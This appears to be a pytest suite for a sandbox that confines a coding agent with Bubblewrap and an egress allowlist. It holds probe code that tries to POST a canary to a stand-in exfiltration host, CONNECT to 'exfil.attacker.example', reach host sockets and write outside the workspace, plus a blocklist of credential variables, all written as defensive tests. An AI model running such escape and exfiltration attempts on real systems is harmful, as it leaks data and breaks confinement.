"""Focused host-boundary and controlled-online sandbox regressions."""

from __future__ import annotations

import json
import os
import shutil
import socket
import subprocess
import threading
import uuid
from pathlib import Path

import pytest

from drex_agent_firewall.sandbox.backend import SandboxSpec
from drex_agent_firewall.sandbox.bubblewrap import BubblewrapBackend
from drex_agent_firewall.sandbox.controlled_egress import (
    AGENT_EGRESS_ALLOWLISTS,
    ControlledEgressBroker,
    _connect_public,
    _valid_host,
)
from drex_agent_firewall.sandbox.factory import get_isolation_backend
from drex_agent_firewall.sandbox.no_isolation import NoIsolationBackend


pytestmark = pytest.mark.skipif(shutil.which("bwrap") is None, reason="Bubblewrap is unavailable")


def _write_codex_auth(home: Path) -> list[str]:
    codex_dir = home / ".codex"
    codex_dir.mkdir(parents=True, exist_ok=True)
    values = {
        "access_token": "drex-test-access-token-unique",
        "id_token": "drex-test-id-token-unique",
        "refresh_token": "drex-test-refresh-token-unique",
        "account_id": "drex-test-account-unique",
    }
    (codex_dir / "auth.json").write_text(
        json.dumps({"auth_mode": "chatgpt", "tokens": values, "last_refresh": "2026-10-01T00:00:00Z"}),
        encoding="utf-8",
    )
    return list(values.values())


def _host_service(host: str) -> tuple[socket.socket, int, threading.Thread]:
    family = socket.AF_INET6 if ":" in host else socket.AF_INET
    listener = socket.socket(family, socket.SOCK_STREAM)
    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    listener.bind((host, 0))
    listener.listen(1)
    listener.settimeout(10.0)
    port = listener.getsockname()[1]

    def serve() -> None:
        try:
            conn, _ = listener.accept()
            with conn:
                conn.sendall(b"DREX_HOST_LOOPBACK_CANARY")
        except OSError:
            pass

    thread = threading.Thread(target=serve, daemon=True)
    thread.start()
    return listener, port, thread


def test_bubblewrap_never_mounts_host_local_or_home_and_keeps_codex_system_only(tmp_path, monkeypatch):
    host_home = tmp_path / "host-home"
    canary = host_home / ".local" / "share" / "drex-host-canary"
    canary.parent.mkdir(parents=True)
    canary.write_text("DREX_FAKE_HOST_LOCAL_CANARY_2026", encoding="utf-8")
    monkeypatch.setenv("HOME", str(host_home))
    workspace = tmp_path / "workspace"
    workspace.mkdir()

    backend = BubblewrapBackend()
    spec = SandboxSpec(session_id="no-local-mount", workspace_path=str(workspace), agent_type="codex", network_mode="none")
    backend.prepare(spec)
    args = backend._build_bwrap_args(spec, backend._sessions[spec.session_id])
    joined = "\0".join(args)
    try:
        assert "/opt/agent_tools" not in joined
        assert str(host_home / ".local") not in joined
        assert str(host_home) not in joined
        assert "/home/agent" in joined
        assert "/usr" in joined
        assert backend._required_system_agent_binary("codex") == "/usr/bin/codex"

        probe = backend.exec(
            spec.session_id,
            ["python3", "-c", "import json,os; print(json.dumps({'host_home':os.path.exists('/home/host-home'),'local_mount':os.path.exists('/opt/agent_tools'),'canary':os.path.exists('/opt/agent_tools/share/drex-host-canary')}))"],
        )
        assert probe.returncode == 0
        assert json.loads(probe.stdout) == {"host_home": False, "local_mount": False, "canary": False}
    finally:
        backend.destroy(spec.session_id)


def test_system_codex_runs_inside_network_none_without_user_directory_mount(tmp_path):
    workspace = tmp_path / "workspace"
    workspace.mkdir()
    backend = BubblewrapBackend()
    spec = SandboxSpec(session_id="codex-system-bin", workspace_path=str(workspace), agent_type="codex", network_mode="none")
    backend.prepare(spec)
    try:
        result = backend.exec(spec.session_id, ["/usr/bin/codex", "--version"], timeout=10)
        assert result.returncode == 0
        assert "codex-cli 0.152.1" in result.stdout
        args = backend._build_bwrap_args(spec, backend._sessions[spec.session_id])
        assert "--unshare-net" in args
        assert "--share-net" not in args
        assert "--setenv" in args
        assert "HTTP_PROXY" not in args
        assert "/opt/agent_tools" not in args
    finally:
        backend.destroy(spec.session_id)


def test_lowercase_proxy_and_credential_environment_names_are_blocked(tmp_path, monkeypatch):
    workspace = tmp_path / "workspace"
    workspace.mkdir()
    names = ("https_proxy", "http_proxy", "all_proxy", "no_proxy", "ssh_auth_sock", "openai_api_key")
    for name in names:
        monkeypatch.setenv(name, "fake-unapproved-value")
    spec = SandboxSpec(
        session_id="lowercase-env-block",
        workspace_path=str(workspace),
        agent_type="codex",
        network_mode="none",
        env_allowlist=list(names),
        env_overrides={name: "explicit-fake-value" for name in names},
    )
    backend = BubblewrapBackend()
    backend.prepare(spec)
    try:
        sanitized = backend._sanitize_environment(spec)
        assert all(name not in sanitized for name in names)
        code = "import os; print('|'.join('1' if os.getenv(k) else '0' for k in %r))" % (names,)
        result = backend.exec(
            spec.session_id,
            ["python3", "-c", code],
            env={name: "per-call-fake-value" for name in names},
        )
        assert result.returncode == 0
        assert result.stdout.strip() == "|".join("0" for _ in names)
    finally:
        backend.destroy(spec.session_id)


def test_controlled_auth_is_explicit_read_only_redacted_and_cleaned(tmp_path, monkeypatch):
    host_home = tmp_path / "host-home"
    host_home.mkdir()
    auth_values = _write_codex_auth(host_home)
    monkeypatch.setenv("HOME", str(host_home))
    workspace = tmp_path / "workspace"
    workspace.mkdir()

    backend = BubblewrapBackend()
    spec = SandboxSpec(session_id="codex-auth-cleanup", workspace_path=str(workspace), agent_type="codex", network_mode="controlled-online")
    backend.prepare(spec)
    session = backend._sessions[spec.session_id]
    try:
        args = backend._build_bwrap_args(spec, session)
        assert "--unshare-net" in args
        assert "--share-net" not in args
        assert "/opt/agent_tools" not in args
        assert "HTTP_PROXY" not in args

        auth_file, collected = backend._stage_runtime_auth(spec, session)
        try:
            assert stat_is_read_only(auth_file)
            minimal = json.loads(Path(auth_file).read_text(encoding="utf-8"))
            assert set(minimal) == {"auth_mode", "tokens", "last_refresh"}
            assert set(minimal["tokens"]) == {"access_token", "id_token", "refresh_token", "account_id"}
            assert set(auth_values).issubset(set(collected))
        finally:
            os.unlink(auth_file)

        result = backend.exec_agent(spec.session_id, ["/usr/bin/codex", "--version"], timeout=10)
        assert result.returncode == 0
        assert "codex-cli 0.152.1" in result.stdout
        assert not any(value in result.stdout + result.stderr for value in auth_values)
        assert not (Path(session["agent_home"]) / ".codex" / "auth.json").exists()
        assert not any(value in repr(session) for value in auth_values)
        redacted = backend._redact_runtime_auth("token=" + auth_values[0], auth_values)
        assert auth_values[0] not in redacted
        assert "[REDACTED]" in redacted
    finally:
        backend.destroy(spec.session_id)


def stat_is_read_only(path: str) -> bool:
    return (os.stat(path).st_mode & 0o222) == 0


def test_missing_auth_fails_before_any_bwrap_launch(tmp_path, monkeypatch):
    host_home = tmp_path / "empty-home"
    host_home.mkdir()
    monkeypatch.setenv("HOME", str(host_home))
    workspace = tmp_path / "workspace"
    workspace.mkdir()
    backend = BubblewrapBackend()
    spec = SandboxSpec(session_id="missing-codex-auth", workspace_path=str(workspace), agent_type="codex", network_mode="controlled-online")
    backend.prepare(spec)
    try:
        with pytest.raises(RuntimeError, match="Codex authentication is missing"):
            backend.exec_agent(spec.session_id, ["/usr/bin/codex", "--version"])
        assert backend.name == "bubblewrap"
    finally:
        backend.destroy(spec.session_id)


def test_controlled_network_setup_failure_does_not_fall_back(tmp_path, monkeypatch):
    host_home = tmp_path / "host-home"
    host_home.mkdir()
    _write_codex_auth(host_home)
    monkeypatch.setenv("HOME", str(host_home))
    workspace = tmp_path / "workspace"
    workspace.mkdir()
    backend = BubblewrapBackend()
    spec = SandboxSpec(session_id="proxy-setup-failure", workspace_path=str(workspace), agent_type="codex", network_mode="controlled-online")
    backend.prepare(spec)

    def fail_bridge(*_args, **_kwargs):
        raise OSError("synthetic bridge setup failure")

    launched = []
    monkeypatch.setattr("drex_agent_firewall.sandbox.controlled_egress.ControlledEgressBroker.start", fail_bridge)
    monkeypatch.setattr("drex_agent_firewall.sandbox.bubblewrap.subprocess.Popen", lambda *a, **k: launched.append(True))
    try:
        result = backend.exec_agent(spec.session_id, ["/usr/bin/codex", "--version"])
        assert result.returncode == -1
        assert "controlled online execution failed closed" in result.stderr.lower()
        assert "no host-network fallback" in result.stderr.lower()
        assert not launched
    finally:
        backend.destroy(spec.session_id)


def test_provider_proxy_policy_rejects_unapproved_and_private_destinations(monkeypatch):
    allowed = AGENT_EGRESS_ALLOWLISTS["codex"]
    assert _valid_host("api.openai.com", allowed)
    assert _valid_host("CHATGPT.COM.", allowed)
    assert not _valid_host("attacker.example", allowed)
    assert not _valid_host("127.0.0.1", allowed)

    def private_dns(*_args, **_kwargs):
        return [(socket.AF_INET, socket.SOCK_STREAM, 6, "", ("192.168.0.10", 443))]

    monkeypatch.setattr("drex_agent_firewall.sandbox.controlled_egress.socket.getaddrinfo", private_dns)
    with pytest.raises(ConnectionError, match="globally routable"):
        _connect_public("api.openai.com", 443)


def test_controlled_bridge_policy_denies_external_host_without_connecting():
    socket_path = f"/tmp/drex-probe-{uuid.uuid4().hex[:8]}.sock"
    broker = ControlledEgressBroker(socket_path, AGENT_EGRESS_ALLOWLISTS["codex"])
    broker.start()
    try:
        for target in ("exfil.attacker.example", "127.0.0.1"):
            agent_side = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
            agent_side.connect(socket_path)
            agent_side.sendall(f"CONNECT {target} 443\n".encode("ascii"))
            response = bytearray()
            while not response.endswith(b"\n"):
                response.extend(agent_side.recv(1))
            assert bytes(response) == b"ERR policy\n"
            agent_side.close()
    finally:
        broker.close()


def test_controlled_proxy_blocks_fake_exfil_and_mounts_no_host_runtime_socket(tmp_path, monkeypatch):
    host_home = tmp_path / "host-home"
    host_home.mkdir()
    canary = host_home / ".local" / "share" / "drex-host-canary"
    canary.parent.mkdir(parents=True)
    canary.write_text("DREX_FAKE_HOST_LOCAL_CANARY_ONLY", encoding="utf-8")
    runtime_path = Path("/tmp") / f"drex-runtime-probe-{uuid.uuid4().hex[:8]}.sock"
    runtime_listener = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    runtime_listener.bind(str(runtime_path))
    runtime_listener.listen(1)
    loopback_listener, loopback_port, loopback_thread = _host_service("127.0.0.1")
    monkeypatch.setenv("HOME", str(host_home))
    monkeypatch.setenv("SSH_AUTH_SOCK", str(runtime_path))
    monkeypatch.setenv("HTTPS_PROXY", "http://fake-user:fake-password@127.0.0.1:65533")
    monkeypatch.setenv("DREX_UNAPPROVED_CANARY", "must-not-enter")
    workspace = tmp_path / "workspace"
    workspace.mkdir()
    backend = BubblewrapBackend()
    spec = SandboxSpec(session_id="proxy-exfil-probe", workspace_path=str(workspace), agent_type="codex", network_mode="controlled-online")
    backend.prepare(spec)
    socket_path = os.path.join(backend._sessions[spec.session_id]["session_tmp"], "egress.sock")
    broker = ControlledEgressBroker(socket_path, AGENT_EGRESS_ALLOWLISTS["codex"])
    broker.start()
    try:
        args = backend._build_bwrap_args(spec, backend._sessions[spec.session_id], egress_socket_path=socket_path)
        probe_code = r'''import json, os, socket, sys, urllib.error, urllib.request
proxy=os.environ.get("HTTPS_PROXY","")
blocked=False
request=urllib.request.Request("https://drex-exfil.invalid/collect",data=b"DREX_FAKE_EXFIL_CANARY_ONLY",method="POST")
try:
    urllib.request.urlopen(request,timeout=5)
except (urllib.error.URLError,TimeoutError,OSError):
    blocked=True
except Exception as exc:
    blocked=getattr(exc,"code",0)==403
def reaches_host():
    try:
        with socket.create_connection(("127.0.0.1",int(sys.argv[2])),timeout=1) as c:
            c.settimeout(1)
            return c.recv(128)==b"DREX_HOST_LOOPBACK_CANARY"
    except OSError:
        return False
print(json.dumps({"exfil_blocked":blocked,"proxy_loopback":proxy.startswith("http://127.0.0.1:"),"host_home_users":sorted(os.listdir("/home")),"agent_tools":os.path.exists("/opt/agent_tools"),"local_canary":os.path.exists("/opt/agent_tools/share/drex-host-canary"),"fake_runtime":os.path.exists(sys.argv[1]),"docker":os.path.exists("/run/docker.sock") or os.path.exists("/var/run/docker.sock"),"podman":os.path.exists("/run/user/1000/podman/podman.sock"),"ssh_auth_sock":os.environ.get("SSH_AUTH_SOCK"),"unapproved":os.environ.get("DREX_UNAPPROVED_CANARY"),"host_loopback":reaches_host()}))'''
        args.extend([
            "--", "/usr/bin/python3", "/opt/drex-firewall/src/drex_agent_firewall/sandbox/proxy_launcher.py",
            "--bridge-socket", "/run/drex-egress.sock", "--", "/usr/bin/python3", "-c", probe_code, str(runtime_path), str(loopback_port),
        ])
        result = subprocess.run(args, env={"PATH": "/usr/bin:/bin", "LANG": "C.UTF-8"}, capture_output=True, text=True, timeout=15)
        assert result.returncode == 0, result.stderr
        data = json.loads(result.stdout)
        assert data["exfil_blocked"]
        assert data["proxy_loopback"]
        assert data["host_home_users"] == ["agent"]
        assert not data["agent_tools"]
        assert not data["local_canary"]
        assert not data["fake_runtime"]
        assert not data["docker"]
        assert not data["podman"]
        assert data["ssh_auth_sock"] is None
        assert data["unapproved"] is None
        assert not data["host_loopback"]
        assert "DREX_FAKE_EXFIL_CANARY_ONLY" not in result.stdout + result.stderr
    finally:
        broker.close()
        backend.destroy(spec.session_id)
        runtime_listener.close()
        try:
            runtime_path.unlink()
        except FileNotFoundError:
            pass
        loopback_listener.close()
        loopback_thread.join(timeout=1)


def test_host_canaries_loopback_runtime_socket_env_and_outside_write_are_blocked(tmp_path, monkeypatch):
    host_home = tmp_path / "host-home"
    local_canary = host_home / ".local" / "share" / "drex-host-canary"
    local_canary.parent.mkdir(parents=True)
    local_canary.write_text("DREX_FAKE_HOST_LOCAL_CANARY_UNIQUE", encoding="utf-8")
    home_canary = host_home / "DREX_HOST_HOME_CANARY"
    home_canary.write_text("DREX_FAKE_HOST_HOME_CANARY_UNIQUE", encoding="utf-8")
    docker_dir = host_home / ".docker"
    docker_dir.mkdir()
    runtime_path = Path("/tmp") / f"drex-fake-runtime-{uuid.uuid4().hex[:8]}.sock"
    runtime_listener = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    runtime_listener.bind(str(runtime_path))
    runtime_listener.listen(1)
    monkeypatch.setenv("HOME", str(host_home))
    monkeypatch.setenv("SSH_AUTH_SOCK", str(runtime_path))
    monkeypatch.setenv("DREX_UNAPPROVED_TEST_CANARY", "must-not-enter")

    workspace = tmp_path / "workspace"
    workspace.mkdir()
    outside_target = tmp_path / "outside-workspace-target"
    outside_target.write_text("host-marker-unchanged", encoding="utf-8")
    v4_listener, v4_port, v4_thread = _host_service("127.0.0.1")
    try:
        try:
            v6_listener, v6_port, v6_thread = _host_service("::1")
        except OSError:
            v6_listener, v6_port, v6_thread = None, None, None
        lan_listener = None
        lan_thread = None
        lan_host = None
        lan_port = None
        try:
            route_probe = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            route_probe.connect(("192.0.2.1", 9))
            lan_host = route_probe.getsockname()[0]
            route_probe.close()
            if lan_host and not lan_host.startswith("127."):
                lan_listener, lan_port, lan_thread = _host_service(lan_host)
        except OSError:
            pass

        spec = SandboxSpec(session_id="adversarial-boundary-probes", workspace_path=str(workspace), agent_type="codex", network_mode="controlled-online")
        backend = BubblewrapBackend()
        backend.prepare(spec)
        try:
            source = r'''import json, os, socket, sys
def can_reach(host, port):
    try:
        with socket.create_connection((host, port), timeout=1) as c:
            c.settimeout(1)
            return c.recv(128) == b"DREX_HOST_LOOPBACK_CANARY"
    except OSError:
        return False
outside = sys.argv[1]
runtime = sys.argv[2]
home_canary = sys.argv[3]
local_canary = sys.argv[4]
try:
    open(outside, "w").write("escaped")
    outside_write_in_namespace = True
except OSError:
    outside_write_in_namespace = False
try:
    socket.socket(socket.AF_UNIX, socket.SOCK_STREAM).connect(runtime)
    runtime_socket = True
except OSError:
    runtime_socket = False
print(json.dumps({
 "home": os.environ.get("HOME"),
 "home_users": os.listdir("/home"),
 "host_home_canary": os.path.exists(home_canary),
 "host_local_canary": os.path.exists(local_canary) or os.path.exists("/opt/agent_tools/share/drex-host-canary"),
 "agent_tools_mount": os.path.exists("/opt/agent_tools"),
 "runtime_socket": runtime_socket or os.path.exists(runtime),
 "docker_socket": os.path.exists("/var/run/docker.sock") or os.path.exists("/run/docker.sock"),
 "podman_socket": os.path.exists("/run/user/1000/podman/podman.sock"),
 "ssh_auth_sock": os.environ.get("SSH_AUTH_SOCK"),
 "unapproved_env": os.environ.get("DREX_UNAPPROVED_TEST_CANARY"),
 "host_v4_loopback": can_reach("127.0.0.1", int(sys.argv[5])),
 "host_v6_loopback": can_reach("::1", int(sys.argv[6])) if sys.argv[6] != "none" else False,
 "host_lan": can_reach(sys.argv[7], int(sys.argv[8])) if sys.argv[7] != "none" else False,
 "outside_write": outside_write_in_namespace,
}))'''
            result = backend.exec(
                spec.session_id,
                ["python3", "-c", source, str(outside_target), str(runtime_path), str(home_canary), str(local_canary), str(v4_port), str(v6_port if v6_port is not None else "none"), str(lan_host or "none"), str(lan_port if lan_port is not None else "none")],
                timeout=10,
            )
            assert result.returncode == 0, result.stderr
            data = json.loads(result.stdout)
            assert data["home"] == "/home/agent"
            assert data["home_users"] == ["agent"]
            assert not data["host_home_canary"]
            assert not data["host_local_canary"]
            assert not data["agent_tools_mount"]
            assert not data["runtime_socket"]
            assert not data["docker_socket"]
            assert not data["podman_socket"]
            assert data["ssh_auth_sock"] is None
            assert data["unapproved_env"] is None
            assert not data["host_v4_loopback"]
            assert not data["host_v6_loopback"]
            assert not data["host_lan"]
            assert not data["outside_write"]
            assert outside_target.read_text(encoding="utf-8") == "host-marker-unchanged"
        finally:
            backend.destroy(spec.session_id)
    finally:
        runtime_listener.close()
        try:
            runtime_path.unlink()
        except FileNotFoundError:
            pass
        v4_listener.close()
        if 'v6_listener' in locals() and v6_listener is not None:
            v6_listener.close()
        if 'lan_listener' in locals() and lan_listener is not None:
            lan_listener.close()
        v4_thread.join(timeout=1)
        if 'v6_thread' in locals() and v6_thread is not None:
            v6_thread.join(timeout=1)
        if 'lan_thread' in locals() and lan_thread is not None:
            lan_thread.join(timeout=1)


def test_auto_backend_never_falls_back_to_no_isolation(monkeypatch):
    from drex_agent_firewall.sandbox import factory

    monkeypatch.setattr(factory.BubblewrapBackend, "is_available", lambda self: False)
    monkeypatch.setattr(factory.PodmanBackend, "is_available", lambda self: False)
    monkeypatch.setattr(factory.DockerBackend, "is_available", lambda self: False)
    with pytest.raises(RuntimeError, match="FAIL-CLOSED"):
        backend = get_isolation_backend("auto")
        assert not isinstance(backend, NoIsolationBackend)
